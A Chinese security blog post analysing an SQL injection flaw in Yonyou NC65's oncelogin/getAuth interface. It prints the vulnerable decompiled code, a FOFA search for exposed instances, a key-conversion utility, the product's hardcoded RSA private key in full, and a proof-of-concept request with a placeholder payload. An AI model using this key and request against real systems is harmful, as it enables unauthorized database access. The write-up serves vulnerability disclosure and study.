---
title: "用友NC oncelogin/getAuth SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-oncelogin-getAuth-sqli.html
---

# 用友NC oncelogin/getAuth SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/12 14:14
* 970浏览
* [0评论](#comment)
* 1小时
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
NC系统的 oncelogin/getAuth 接口存在
[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
漏洞。攻击者可通过构造恶意的 SQL 语句注入请求参数，绕过身份验证或获取数据库敏感信息，进而可能导致任意数据读取、篡改甚至系统权限提升，影响系统的安全性和数据完整性。

# 影响版本

NC65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

根据漏洞通告可知
[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
点在
**oncelogin**

![用友NC oncelogin/getAuth SQL注入漏洞](https://image.mrxn.net/022ef974714047d4bce5d65c3551426a.webp)

直接看
`OnceLoginAction`
类的
`getAuth`
方法的实现逻辑吧

```
@Servlet(path="/oncelogin")
public class OnceLoginAction
extends BaseAction {
....
@Action
public void getAuth() throws BusinessException {
    String key = "serverPathOK";
    JSONObject jsonRoot = this.buidJSON(key, null);
    String param = this.request.getParameter("param");
    param = RSACrypto.getInstance().decipher(param);
    String user_code = null;
    if (param.contains("user_code")) {
        user_code = param.substring(param.indexOf("user_code=") + 10, param.indexOf("&"));
    }
    if (StringUtils.isEmpty(user_code)) {
        return;
    }
    String serverPathOK = "";
    String path = CommonUtils.getServerPath();
    PersonsynVO ps = ((IPersonsynQueryService)NCLocator.getInstance().lookup(IPersonsynQueryService.class)).queryPersonsynByImUserName(user_code);
```

参数param首先需要经过
`RSACrypto.getInstance().decipher`
解密，跟进RSA的
`decipher`
方法看下

## RSA加解密

```
public String decipher(String content) {
    InputStream fis = null;
    ObjectInputStream ois = null;
    try {
        if (content == null || content.equals("")) {
            String string = null;
            return string;
        }
        byte[] base64Code = Base64.decodeBase64((byte[])content.getBytes("UTF-8"));
        BigInteger c = new BigInteger(base64Code);
        fis = RSACrypto.class.getResourceAsStream("Skey_RSA_PRIV.dat");
        ois = new ObjectInputStream(fis);
        RSAPrivateKey prk = (RSAPrivateKey)ois.readObject();
        BigInteger d = prk.getPrivateExponent();
        BigInteger n = prk.getModulus();
        BigInteger m = c.modPow(d, n);
        String string = new String(m.toByteArray(), "UTF-8");
        return string;
    }
```

根据代码的
`ObjectInputStream`
可知：

* `Skey_RSA_PRIV.dat`
  文件里存储的是一个
  `RSAPrivateKey`
  对象的序列化结果。
* 可以通过Java反序列化直接还原出
  `RSAPrivateKey`
  对象。

现在是去找到这个序列化的私钥，然后还原成我们常见的证书格式如-----BEGIN PRIVATE KEY-----这种，根据decipher的方法包路径
`/nc/bs/oa/oaco/im/RSACrypto.java`
直接在用友
`/modules/oaco/lib`
目录下的
`puboaco_instantmessage.jar`
包找到了
`Skey_RSA_PRIV.dat`
和
`Skey_RSA_PUB.dat`

![用友NC oncelogin/getAuth SQL注入漏洞](https://image.mrxn.net/6275fa85b25e485bad65504bda8696e5.webp)

查看下内容，果然是序列化的对象

![用友NC oncelogin/getAuth SQL注入漏洞](https://image.mrxn.net/947c329b95704dc6a7f5a3f2f3b81314.webp)

ok,找到了，我们让AI写一个java来还原

```
import java.io.*;
import java.security.Key;
import java.util.Base64;

public class NC_RSA_KEY_CONVERT {
    public static void main(String[] args) {
        String filename = "Skey_RSA_PUB.dat";
        if (args.length > 0 && args[0] != null && !args[0].trim().isEmpty()) {
            filename = args[0];
        }
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename))) {
            Object obj = ois.readObject();
            if (obj instanceof Key) {
                Key key = (Key) obj;
                System.out.println("算法名 (Algorithm): " + key.getAlgorithm());
                System.out.println("编码格式 (Format): " + key.getFormat());
                System.out.println("类型 (Type): " + key.getClass().getSimpleName());
                byte[] encoded = key.getEncoded();

                // 输出PEM格式
                String base64 = Base64.getEncoder().encodeToString(encoded);
                String type = getPemType(filename);
                System.out.println("\n-----BEGIN " + type + " KEY-----");
                printPem(base64);
                System.out.println("-----END " + type + " KEY-----");
            } else {
                System.out.println("不是Key类型，实际类型是: " + obj.getClass().getName());
            }
        } catch (Exception e) {
            System.err.println("读取或解析失败: " + e);
            e.printStackTrace();
        }
    }

    private static String getPemType(String filename) {
        String upper = filename.toUpperCase();
        if (upper.contains("PUB")) {
            return "PUBLIC";
        } else if (upper.contains("PRIV")) {
            return "PRIVATE";
        } else {
            return "";
        }
    }

    private static void printHex(byte[] data) {
        for (int i = 0; i < data.length; i++) {
            System.out.printf("%02X", data[i]);
            if ((i + 1) % 16 == 0) System.out.println();
            else System.out.print(" ");
        }
        System.out.println();
    }

    private static void printPem(String base64) {
        int lineLen = 64;
        for (int i = 0; i < base64.length(); i += lineLen) {
            int end = Math.min(i + lineLen, base64.length());
            System.out.println(base64.substring(i, end));
        }
    }
}
```

然后
`javac NC_RSA_KEY_CONVERT.java`
编译，再执行
`java NC_RSA_KEY_CONVERT Skey_RSA_PRIV.dat`
即可得到常见rsa证书格式

```
tmp# java NC_RSA_KEY_CONVERT Skey_RSA_PRIV.dat
算法名 (Algorithm): RSA
编码格式 (Format): PKCS#8
类型 (Type): RSAPrivateCrtKeyImpl

-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAJfmPzz4SmfMMNcG
WX3J4EyBrAsB33rTQ/JmFFWac34Y2Irrvfd8qRrcseJwFlIGGjg3lCerpHGPy4P4
BN4Wpzj4mHBycgvjRkmb8omVqnpZBtv1Lr3tuTrOIV4oeXI/93/8IbbU4VScPX6X
S6pZpKoYhl4u2hbiTxsnc+Rjh+eXAgMBAAECgYEAlhr+5QZLqNUccnCg4PAsyg3e
cKYyLNM3MwPzFkDh3ns5Cdc6S6YSCiyLUMQJGpdTM7ignK8+esZpjAj87mceaWVR
y+or+9uBwzaWaJCf6FRKzFFapekLhzRuWT4OiqwG5bPpf9hogVMKf4DXg+FIzgTt
kHM9VcYLhWwvifULFbkCQQDJrHyuVsfXAVlKffTZIVBnD+ykfTzFXwTgVWuqwVQy
mSsbzULbcsOkR1F4mmecdkz4uPmezjNuSsBAizgbVy4FAkEAwNFMC7OM2JhJRLFs
TGYXFdEQWkyLCX2VfWL31G8sEBsG6x/YXajbPrHvhVo6N6Z6gs2/QRawDGs+G0DE
I6VV6wJBAMPsIiRsgjBKSyinPRtD1gyJ1+flEwjbyqz1z2dP8jBFxS95NZ5j29TY
xDlaJ5ZFB3oKmdbBlA1t6V/K4HMPOtECQHWbs8y3WcOLL7WMmsgGxTHzcQwDABNr
3FC8mvmiTbgNJC0qIWkPY5tcIQKvxC7JhpReNrfWxM7uYtVwrbIoWL0CQCdyASkB
HbmomKnm+gyixwsD2j6uMpliQ3//ZjJWLo7IVzk6OrQFCOjcE91IB+BLo014h1Ro
P6/ZCPAeaFCVlAg=
-----END PRIVATE KEY-----
```

以及公钥（我们加密需要）

```
tmp# java NC_RSA_KEY_CONVERT Skey_RSA_PUB.dat
算法名 (Algorithm): RSA
编码格式 (Format): X.509
类型 (Type): RSAPublicKeyImpl

-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCX5j88+EpnzDDXBll9yeBMgawL
Ad9600PyZhRVmnN+GNiK6733fKka3LHicBZSBho4N5Qnq6Rxj8uD+ATeFqc4+Jhw
cnIL40ZJm/KJlap6WQbb9S697bk6ziFeKHlyP/d//CG21OFUnD1+l0uqWaSqGIZe
LtoW4k8bJ3PkY4fnlwIDAQAB
-----END PUBLIC KEY-----
```

继续往下看

## SQL注入

```
String user_code = null;
if (param.contains("user_code")) {
    user_code = param.substring(param.indexOf("user_code=") + 10, param.indexOf("&"));
}
if (StringUtils.isEmpty(user_code)) {
    return;
}
String serverPathOK = "";
String path = CommonUtils.getServerPath();
PersonsynVO ps = ((IPersonsynQueryService)NCLocator.getInstance().lookup(IPersonsynQueryService.class)).queryPersonsynByImUserName(user_code);
```

参数
`param`
值经过解密后，判断是否包含
`user_code`
，如果不包含就会直接退出，否则提取
`user_code=`
后至
`&`
之间的内容带入
`queryPersonsynByImUserName`
方法，跟进
`queryPersonsynByImUserName`
方法看下它的实现

```
public PersonsynVO queryPersonsynByImUserName(String imUserName) throws BusinessException {
    String whereCondStr = "imname='" + imUserName + "'";
    Collection personsyns = this.getOaQueryService().queryBillOfVOByCond(PersonsynVO.class, whereCondStr, true);
    if (personsyns != null && personsyns.size() > 0 && personsyns.iterator().hasNext()) {
        return (PersonsynVO)personsyns.iterator().next();
    }
    return null;
}
```

到这里，整个漏洞形成原因也就明了了，参数
`param`
值经过解密后提取
`user_code=`
后至
`&`
之间的内容被直接拼接在
`imname='`
后面，无任何过滤或校验，因此造成了
[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
漏洞。

# 漏洞复现

> 需注意NC65 大多数为Oracle 少数MSSQL

将payload使用rsa公钥加密

![用友NC oncelogin/getAuth SQL注入漏洞](https://image.mrxn.net/625066eab162433091465d4dfd4204a9.webp)

出击！

```
POST /portal/pt/oncelogin/getAuth?pageId=login HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-www-form-urlencoded

param=RSA_ENC_SQLI_POC
```

![用友NC oncelogin/getAuth SQL注入漏洞](https://image.mrxn.net/308811c79964404f9ca178ec30207103.webp)

通过报错注入成功在响应回显当前数据库用户！

PS: 也属于老洞了,其实在年初就检测到有此漏洞攻击，一直懒 没看-\_- 不过官方发公告了，那我也就浅析下。

其他用友相关漏洞分析：
<https://mrxn.net/?keyword=%E7%94%A8%E5%8F%8B>

# 参考

* [关于NC系统oncelogin getAuth 接口存在sql注入漏洞的修复通告](https://security.yonyou.com/#/noticeInfo?id=726)

* 标签：
* [#
  代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#
  SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#
  代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#
  Java](https://mrxn.net/tag/Java)
* [#
  用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[用友NC oncelogin/getAuth SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-oncelogin-getAuth-sqli.html)
  
文章链接：
<https://mrxn.net/jswz/yonyou-nc-oncelogin-getAuth-sqli.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-oncelogin-getAuth-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-oncelogin-getAuth-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});